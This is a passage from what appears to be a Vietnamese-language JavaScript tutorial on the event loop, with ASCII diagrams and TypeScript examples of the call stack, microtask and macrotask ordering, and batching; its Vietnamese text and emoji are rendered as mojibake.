â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚                                                             â”‚    â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚    â”‚
â”‚  â”‚  â”‚  ğŸ”¥ CALL STACK (LIFO)                               â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€       â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â”‚ function3() â”‚ â† Top (Ä‘ang thá»±c thi)              â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â”‚ function2() â”‚                                     â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â”‚ function1() â”‚                                     â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â”‚   main()    â”‚ â† Bottom                            â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                     â”‚  â”‚    â”‚
â”‚  â”‚  â”‚                                                       â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  ğŸ“¦ HEAP (Memory Allocation)                         â”‚  â”‚    â”‚
â”‚  â”‚  â”‚  â€¢ Objects, Arrays, Functions                        â”‚  â”‚    â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  ğŸŒ WEB APIs (Browser/Node.js)                            â”‚    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚  â€¢ setTimeout() / setInterval()                            â”‚    â”‚
â”‚  â”‚  â€¢ DOM Events (click, scroll, etc.)                        â”‚    â”‚
â”‚  â”‚  â€¢ fetch() / XMLHttpRequest                                â”‚    â”‚
â”‚  â”‚  â€¢ FileReader / Web Workers                                â”‚    â”‚
â”‚  â”‚  â€¢ Geolocation / Notification                              â”‚    â”‚
â”‚  â”‚  â€¢ IndexedDB / LocalStorage                                â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                             â†“ callbacks                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  âš¡ MICROTASK QUEUE (High Priority)                        â”‚    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚  â€¢ Promise.then() / Promise.catch()                        â”‚    â”‚
â”‚  â”‚  â€¢ queueMicrotask()                                        â”‚    â”‚
â”‚  â”‚  â€¢ MutationObserver                                        â”‚    â”‚
â”‚  â”‚  â€¢ process.nextTick() (Node.js only - highest priority)   â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  ğŸ¯ MACROTASK QUEUE (Task Queue - Low Priority)           â”‚    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚  â€¢ setTimeout() / setInterval()                            â”‚    â”‚
â”‚  â”‚  â€¢ setImmediate() (Node.js only)                           â”‚    â”‚
â”‚  â”‚  â€¢ I/O operations (fs, network)                            â”‚    â”‚
â”‚  â”‚  â€¢ UI rendering (Browser only)                             â”‚    â”‚
â”‚  â”‚  â€¢ requestAnimationFrame() (Browser only)                  â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                      â”‚
â”‚                          â†‘                                           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  ğŸ”„ EVENT LOOP (Infinite Loop)                             â”‚    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚  while (true) {                                            â”‚    â”‚
â”‚  â”‚    1. Check Call Stack â†’ Execute sync code                â”‚    â”‚
â”‚  â”‚    2. Check Microtask Queue â†’ Execute ALL                 â”‚    â”‚
â”‚  â”‚    3. Render UI (if needed - browser only)                â”‚    â”‚
â”‚  â”‚    4. Check Macrotask Queue â†’ Execute ONE                 â”‚    â”‚
â”‚  â”‚    5. Go back to step 1                                   â”‚    â”‚
â”‚  â”‚  }                                                         â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**ğŸ§µ 1. SINGLE THREAD (ÄÆ¡n Luá»“ng)**

**KhÃ¡i niá»‡m:**
- JavaScript Engine chá»‰ cÃ³ **1 Call Stack** duy nháº¥t
- Chá»‰ thá»±c thi **1 function táº¡i 1 thá»i Ä‘iá»ƒm**
- KhÃ´ng thá»ƒ cháº¡y Ä‘á»“ng thá»i nhiá»u tasks nhÆ° multi-threaded languages (Java, C++)

**Æ¯u Ä‘iá»ƒm:**
- âœ… ÄÆ¡n giáº£n, khÃ´ng cÃ³ race conditions
- âœ… KhÃ´ng cáº§n lock/semaphore
- âœ… Dá»… debug hÆ¡n multi-threaded

**NhÆ°á»£c Ä‘iá»ƒm:**
- âš ï¸ Blocking operations (heavy computation) Ä‘Ã³ng bÄƒng toÃ n bá»™ app
- âš ï¸ KhÃ´ng táº­n dá»¥ng Ä‘Æ°á»£c multi-core CPUs

---

**ğŸ”¥ 2. CALL STACK**

**KhÃ¡i niá»‡m:**
- LIFO stack (Last In First Out) chá»©a execution contexts
- Má»—i function call Ä‘Æ°á»£c push vÃ o stack
- Khi function return, nÃ³ Ä‘Æ°á»£c pop ra khá»i stack

**Hoáº¡t Ä‘á»™ng:**
```typescript
function multiply(a: number, b: number): number {
  return a * b; // â‘¢ Pop
}

function square(n: number): number {
  return multiply(n, n); // â‘¡ Push multiply â†’ Pop
}

function printSquare(n: number): void {
  const result = square(n); // â‘  Push square
  console.log(result);
}

printSquare(5);

// Call Stack Timeline:
// â†’ main() 
// â†’ main() â†’ printSquare(5)
// â†’ main() â†’ printSquare(5) â†’ square(5)
// â†’ main() â†’ printSquare(5) â†’ square(5) â†’ multiply(5, 5)
// â†’ main() â†’ printSquare(5) â†’ square(5)  [multiply returns]
// â†’ main() â†’ printSquare(5)  [square returns]
// â†’ main()  [printSquare returns]
// â†’ [empty]
```

**Stack Overflow:**
```typescript
// âŒ Recursive function khÃ´ng cÃ³ Ä‘iá»u kiá»‡n dá»«ng
function recursiveFunction() {
  recursiveFunction(); // Táº¡o vÃ´ háº¡n stack frames
}

recursiveFunction(); // RangeError: Maximum call stack size exceeded
```

---

**ğŸŒ 3. WEB APIs**

**KhÃ¡i niá»‡m:**
- APIs Ä‘Æ°á»£c cung cáº¥p bá»Ÿi **Browser** (hoáº·c Node.js runtime), KHÃ”NG pháº£i JavaScript Engine
- Cháº¡y **bÃªn ngoÃ i** Call Stack â†’ khÃ´ng block main thread
- Khi hoÃ n thÃ nh, callbacks Ä‘Æ°á»£c Ä‘Æ°a vÃ o Queues

**CÃ¡c Web APIs phá»• biáº¿n:**

```typescript
// A. Timers
setTimeout(() => console.log('Timer done'), 1000);
setInterval(() => console.log('Tick'), 1000);

// B. DOM Events
document.getElementById('btn').addEventListener('click', () => {
  console.log('Button clicked');
});

// C. Network Requests
fetch('https://api.example.com/data')
  .then(response => response.json())
  .then(data => console.log(data));

// D. File APIs
const reader = new FileReader();
reader.onload = (e) => console.log(e.target.result);
reader.readAsText(file);

// E. Observers
const observer = new IntersectionObserver((entries) => {
  console.log('Element intersected');
});

// F. Geolocation
navigator.geolocation.getCurrentPosition(
  (position) => console.log(position.coords),
  (error) => console.error(error)
);
```

---

**âš¡ 4. MICROTASK QUEUE (Job Queue)**

**KhÃ¡i niá»‡m:**
- HÃ ng Ä‘á»£i chá»©a **microtasks** (priority cao)
- **Xá»­ lÃ½ Táº¤T Cáº¢** microtasks trÆ°á»›c khi chuyá»ƒn sang macrotask
- Æ¯u tiÃªn: **process.nextTick()** > **Promise** > **queueMicrotask**

**CÃ¡c Microtasks:**
```typescript
// 1. Promise.then/catch/finally
Promise.resolve().then(() => console.log('Microtask 1'));

// 2. queueMicrotask()
queueMicrotask(() => console.log('Microtask 2'));

// 3. MutationObserver
const observer = new MutationObserver(() => {
  console.log('DOM mutated - Microtask 3');
});

// 4. process.nextTick() - Node.js only (highest priority)
process.nextTick(() => console.log('NextTick - Microtask 0'));
```

---

**ğŸ¯ 5. MACROTASK QUEUE (Task Queue / Callback Queue)**

**KhÃ¡i niá»‡m:**
- HÃ ng Ä‘á»£i chá»©a **macrotasks** (priority tháº¥p hÆ¡n microtask)
- Event Loop chá»‰ láº¥y **Má»˜T macrotask** má»—i láº§n
- Sau má»—i macrotask, xá»­ lÃ½ ALL microtasks

**CÃ¡c Macrotasks:**
```typescript
// 1. setTimeout / setInterval
setTimeout(() => console.log('Macrotask 1'), 0);
setInterval(() => console.log('Macrotask 2'), 1000);

// 2. setImmediate - Node.js only
setImmediate(() => console.log('Macrotask 3'));

// 3. I/O operations
fs.readFile('file.txt', (err, data) => {
  console.log('File read - Macrotask 4');
});

// 4. UI rendering events (Browser)
requestAnimationFrame(() => console.log('RAF - Macrotask 5'));
```

---

**ğŸ”„ 6. EVENT LOOP - QUY TRÃŒNH HOáº T Äá»˜NG**

**Thuáº­t toÃ¡n Event Loop:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    1. Execute Call Stack  â”‚  â†’ Cháº¡y háº¿t synchronous code
â”‚       (synchronous code)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  2. Check Microtask Queue â”‚  â†’ Xá»­ lÃ½ Háº¾T Táº¤T Cáº¢ microtasks
â”‚     - process.nextTick()  â”‚     (bao gá»“m cáº£ microtasks má»›i táº¡o)
â”‚     - Promise callbacks   â”‚
â”‚     - queueMicrotask()    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   3. Render UI (Browser)  â”‚  â†’ Update DOM, paint, reflow
â”‚      (if needed)          â”‚     (chá»‰ browser, khÃ´ng pháº£i Node.js)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  4. Check Macrotask Queue â”‚  â†’ Láº¥y Má»˜T macrotask
â”‚     - setTimeout()        â”‚     (chá»‰ 1 cÃ¡i duy nháº¥t)
â”‚     - setImmediate()      â”‚
â”‚     - I/O callbacks       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   5. Go back to Step 1    â”‚  â†’ Láº·p láº¡i vÃ´ háº¡n
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**ğŸ”¢ THá»¨ Tá»° Æ¯U TIÃŠN:**

```
1ï¸âƒ£ Call Stack (Synchronous code)         - Cao nháº¥t
2ï¸âƒ£ process.nextTick() (Node.js)          - Ráº¥t cao
3ï¸âƒ£ Promise microtasks                    - Cao
4ï¸âƒ£ queueMicrotask()                      - Cao
5ï¸âƒ£ setTimeout(fn, 0) / setInterval()     - Tháº¥p
6ï¸âƒ£ setImmediate() (Node.js)              - Tháº¥p hÆ¡n
7ï¸âƒ£ I/O operations                        - Tháº¥p nháº¥t
```

---

**âœ… Æ¯u Ä‘iá»ƒm cá»§a cÆ¡ cháº¿ nÃ y:**
- Non-blocking I/O â†’ á»©ng dá»¥ng responsive
- KhÃ´ng bá»‹ Ä‘Ã³ng bÄƒng khi chá» API/database
- Microtask giÃºp xá»­ lÃ½ Promise nhanh hÆ¡n setTimeout
- UI luÃ´n mÆ°á»£t mÃ  vÃ¬ rendering Ä‘Æ°á»£c Æ°u tiÃªn

**âš ï¸ NhÆ°á»£c Ä‘iá»ƒm:**
- **Microtask starvation**: VÃ´ háº¡n microtasks â†’ macrotask khÃ´ng cháº¡y
- **Callback hell**: Lá»“ng nhiá»u callbacks â†’ khÃ³ Ä‘á»c
- **KhÃ³ debug**: Thá»© tá»± thá»±c thi phá»©c táº¡p hÆ¡n synchronous
- **Heavy computation block UI**: VÃ¬ single-threaded

**Code Example:**

**ğŸ” VÃ­ dá»¥ 1: PhÃ¢n biá»‡t Microtask vs Macrotask**

```typescript
console.log('1: Sync code start'); // â‘  Call Stack

setTimeout(() => console.log('2: Macrotask 1'), 0); // â‘£ Macrotask Queue
setTimeout(() => console.log('3: Macrotask 2'), 0); // â‘£ Macrotask Queue

Promise.resolve()
  .then(() => console.log('4: Microtask 1')) // â‘¡ Microtask Queue
  .then(() => console.log('5: Microtask 2')); // â‘¡ Microtask Queue (chained)

Promise.resolve().then(() => {
  console.log('6: Microtask 3');

  // âš ï¸ Táº¡o thÃªm microtask TRONG microtask
  queueMicrotask(() => console.log('7: Microtask 4'));
});

console.log('8: Sync code end'); // â‘  Call Stack

/* ğŸ¯ OUTPUT (theo thá»© tá»± Event Loop):
1: Sync code start          // â‘  Call Stack: Ä‘á»“ng bá»™
8: Sync code end            // â‘  Call Stack: Ä‘á»“ng bá»™
4: Microtask 1              // â‘¡ ALL Microtasks (xá»­ lÃ½ Háº¾T)
6: Microtask 3              // â‘¡ ALL Microtasks
7: Microtask 4              // â‘¡ ALL Microtasks (táº¡o thÃªm trong microtask)
5: Microtask 2              // â‘¡ ALL Microtasks (chained promise)
2: Macrotask 1              // â‘£ ONE Macrotask (chá»‰ láº¥y 1 cÃ¡i)
3: Macrotask 2              // â‘£ ONE Macrotask (chu ká»³ Event Loop tiáº¿p theo)

ğŸ“‹ Giáº£i thÃ­ch tá»«ng bÆ°á»›c:
1. Call Stack cháº¡y háº¿t code Ä‘á»“ng bá»™ (1, 8)
2. Event Loop xá»­ lÃ½ Háº¾T Táº¤T Cáº¢ microtasks (4, 6, 7, 5)
3. Browser cÃ³ thá»ƒ render UI (náº¿u cáº§n)
4. Event Loop láº¥y Má»˜T macrotask (2)
5. Quay láº¡i bÆ°á»›c 1, xá»­ lÃ½ microtasks rá»“i láº¥y macrotask tiáº¿p theo (3)
*/
```

**ğŸ” VÃ­ dá»¥ 2: Microtask Starvation (ÄÃ³i macrotask)**

```typescript
console.log('Start');

setTimeout(() => {
  console.log('âŒ Macrotask: TÃ´i sáº½ KHÃ”NG BAO GIá»œ cháº¡y!');
}, 0);

// âš ï¸ VÃ” Háº N microtasks - CHáº¶N táº¥t cáº£ macrotasks
function infiniteMicrotasks() {
  Promise.resolve().then(() => {
    console.log('âœ… Microtask: Cháº¡y mÃ£i khÃ´ng dá»«ng...');
    infiniteMicrotasks(); // Táº¡o thÃªm microtask liÃªn tá»¥c
  });
}

infiniteMicrotasks();

/*
âš ï¸ Káº¾T QUáº¢:
- "Start" in ra
- Microtask in ra vÃ´ háº¡n láº§n
- setTimeout KHÃ”NG BAO GIá»œ cháº¡y vÃ¬ Event Loop máº¯c káº¹t á»Ÿ Microtask Queue!

ğŸ’¡ BÃ i há»c: Pháº£i cáº©n tháº­n khi táº¡o microtask trong microtask
*/
```

**ğŸ” VÃ­ dá»¥ 3: Call Stack vá»›i Async/Await**

```typescript
async function asyncFunction() {
  console.log('2: Inside async - before await');

  await Promise.resolve(); // âš¡ await táº¡o microtask

  console.log('5: After await (microtask)');
}

console.log('1: Start');
asyncFunction();
console.log('3: After calling async');

Promise.resolve().then(() => console.log('4: Promise.then (microtask)'));

setTimeout(() => console.log('6: setTimeout (macrotask)'), 0);

/* OUTPUT:
1: Start
2: Inside async - before await
3: After calling async
4: Promise.then (microtask)
5: After await (microtask)
6: setTimeout (macrotask)

ğŸ“‹ Giáº£i thÃ­ch:
- `await` biáº¿n code phÃ­a sau thÃ nh microtask
- Táº¥t cáº£ microtasks (4, 5) cháº¡y trÆ°á»›c macrotask (6)
*/
```

**ğŸ” VÃ­ dá»¥ 4: Thá»±c Táº¿ trong Trading App**

```typescript
interface OrderUpdate {
  orderId: string;
  status: 'pending' | 'filled';
  price: number;
}

class TradingUI {
  private pendingUpdates: OrderUpdate[] = [];

  // âŒ BAD: Má»—i update render ngay (gÃ¢y lag)
  updateOrderBad(order: OrderUpdate) {
    this.renderOrder(order); // Render ngay láº­p tá»©c
  }

  // âœ… GOOD: Batch updates vá»›i microtask
  updateOrderGood(order: OrderUpdate) {
    this.pendingUpdates.push(order);

    // queueMicrotask: Batch táº¥t cáº£ updates trong cÃ¹ng 1 tick
    queueMicrotask(() => {
      if (this.pendingUpdates.length > 0) {
        this.renderBatch(this.pendingUpdates);
        this.pendingUpdates = [];
      }
    });
  }

  private renderOrder(order: OrderUpdate) {
    console.log(`Render single order: ${order.orderId}`);
    // DOM update expensive
  }

  private renderBatch(orders: OrderUpdate[]) {
    console.log(`Render ${orders.length} orders in 1 batch`);
    // DOM update once - HIá»†U QUáº¢ HÆ N!
  }
}

// Test
const ui = new TradingUI();

// Giáº£ sá»­ nháº­n 100 updates cÃ¹ng lÃºc tá»« WebSocket
for (let i = 0; i < 100; i++) {
  ui.updateOrderGood({
    orderId: `ORD-${i}`,
    status: 'filled',
    price: 100 + i,
  });
}

/* ğŸ¯ Káº¾T QUáº¢:
âŒ updateOrderBad: Render 100 láº§n â†’ LAG UI
âœ… updateOrderGood: Render 1 láº§n vá»›i 100 items â†’ SMOOTH UI

ğŸ’¡ Microtask giÃºp batch operations trong cÃ¹ng 1 Event Loop tick
*/
```

**Best Practices:**

```typescript
// âœ… DO: Sá»­ dá»¥ng microtask cho batch operations
class StateManager {
  private updates: Set<() => void> = new Set();
  private scheduled = false;

  scheduleUpdate(callback: () => void) {
    this.updates.add(callback);

    if (!this.scheduled) {
      this.scheduled = true;
      queueMicrotask(() => {
        this.updates.forEach((cb) => cb());
        this.updates.clear();
        this.scheduled = false;
      });
    }
  }
}

// âœ… DO: Sá»­ dá»¥ng macrotask cho defer work
function deferExpensiveWork(work: () => void) {
  setTimeout(work, 0); // Cháº¡y sau khi UI render
}

// âŒ DON'T: Táº¡o vÃ´ háº¡n microtasks
function badInfiniteMicrotask() {
  Promise.resolve().then(() => badInfiniteMicrotask()); // CHáº¶N macrotasks!
}

// âœ… DO: Break vÃ²ng láº·p vá»›i macrotask
function goodDeferWork(count: number) {
  if (count > 0) {
    setTimeout(() => goodDeferWork(count - 1), 0); // Cho phÃ©p UI render
  }
}

// âœ… DO: Hiá»ƒu thá»© tá»± execution Ä‘á»ƒ debug
async function debugEventLoop() {
  console.log('1: Sync');

  queueMicrotask(() => console.log('3: Microtask'));

  await Promise.resolve();
  console.log('4: After await (microtask)');

  setTimeout(() => console.log('5: Macrotask'), 0);

  console.log('2: Sync end');
}
```

**ğŸ“‹ TÃ³m táº¯t Best Practices:**

1. **Microtask (`Promise`, `queueMicrotask`)**: DÃ¹ng cho state updates, batch operations cáº§n xá»­ lÃ½ ngay
2. **Macrotask (`setTimeout`)**: DÃ¹ng cho defer work, animations, cho phÃ©p UI render giá»¯a cÃ¡c tasks
3. **TrÃ¡nh Microtask Starvation**: KhÃ´ng táº¡o vÃ´ háº¡n microtasks, pháº£i cÃ³ Ä‘iá»u kiá»‡n dá»«ng
4. **Async/await**: Hiá»ƒu ráº±ng code sau `await` lÃ  microtask
5. **Debugging**: LuÃ´n nhá»› thá»© tá»±: `Call Stack â†’ All Microtasks â†’ Render â†’ One Macrotask`

**Common Mistakes:**

```typescript
// âŒ MISTAKE 1: NghÄ© setTimeout(fn, 0) cháº¡y ngay láº­p tá»©c
console.log('1');
setTimeout(() => console.log('2'), 0);
console.log('3');
// Output: 1, 3, 2 (KHÃ”NG pháº£i 1, 2, 3!)
// âš ï¸ setTimeout lÃ  macrotask, cháº¡y sau táº¥t cáº£ microtasks

// âŒ MISTAKE 2: QuÃªn Promise.then lÃ  microtask
setTimeout(() => console.log('1: Macro'), 0);
Promise.resolve().then(() => console.log('2: Micro'));
// Output: 2, 1 (microtask cháº¡y TRÆ¯á»šC macrotask!)

// âŒ MISTAKE 3: Blocking Event Loop vá»›i synchronous heavy work
function heavyCalculation() {
  const start = Date.now();
  while (Date.now() - start < 5000) {} // Block 5 giÃ¢y!
  console.log('Done');
}

heavyCalculation(); // UI Ä‘Ã³ng bÄƒng 5 giÃ¢y!

// âœ… FIX: Break thÃ nh chunks vá»›i setTimeout
function heavyCalculationFixed(iterations: number, callback: () => void) {
  const chunkSize = 100;
  let current = 0;

  function processChunk() {
    const end = Math.min(current + chunkSize, iterations);

    for (let i = current; i < end; i++) {
      // Do heavy work
    }

    current = end;

    if (current < iterations) {
      setTimeout(processChunk, 0); // Cho UI render
    } else {
      callback();
    }
  }

  processChunk();
}

// âŒ MISTAKE 4: Microtask starvation
let count = 0;
function addMicrotask() {
  if (count++ < 1000000) {
    Promise.resolve().then(addMicrotask); // VÃ´ háº¡n microtasks!
  }
}
addMicrotask(); // Macrotasks bá»‹ cháº·n!

// âœ… FIX: Giá»›i háº¡n hoáº·c dÃ¹ng macrotask
function addMicrotaskFixed() {
  if (count++ < 1000000) {
    setTimeout(() => addMicrotaskFixed(), 0); // Cho phÃ©p macrotasks khÃ¡c cháº¡y
  }
}
```

**ğŸ“‹ ChÃº thÃ­ch vá» cÃ¡c lá»—i thÆ°á»ng gáº·p:**

1. **setTimeout(fn, 0) â‰  cháº¡y ngay**: NÃ³ lÃ  macrotask, cháº¡y sau táº¥t cáº£ microtasks vÃ  code Ä‘á»“ng bá»™
2. **Promise.then cháº¡y trÆ°á»›c setTimeout**: Microtask luÃ´n Æ°u tiÃªn cao hÆ¡n macrotask
3. **Blocking code lÃ m Ä‘Ã³ng bÄƒng UI**: Pháº£i break heavy work thÃ nh chunks vá»›i setTimeout
4. **Microtask starvation**: Táº¡o vÃ´ háº¡n microtasks sáº½ cháº·n macrotasks â†’ UI khÃ´ng render Ä‘Æ°á»£c
</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ’¬ Q13: Event Loop - Giáº£i ThÃ­ch Theo CÃ¡ch NÃ³i Chuyá»‡n Äá»i ThÆ°á»ng</span></summary>


**ğŸ¯ Má»¥c ÄÃ­ch:**

Giáº£i thÃ­ch Event Loop theo cÃ¡ch dá»… hiá»ƒu nháº¥t, KHÃ”NG dÃ¹ng thuáº­t ngá»¯ technical, giá»‘ng nhÆ° Ä‘ang ká»ƒ chuyá»‡n cho ngÆ°á»i khÃ´ng biáº¿t láº­p trÃ¬nh.


**ğŸ“– CÃ¢u Chuyá»‡n: QuÃ¡n CÃ  PhÃª vÃ  NgÆ°á»i Phá»¥c Vá»¥**

TÆ°á»Ÿng tÆ°á»£ng báº¡n má»Ÿ má»™t quÃ¡n cÃ  phÃª nhá»:

**ğŸª SETUP BAN Äáº¦U:**

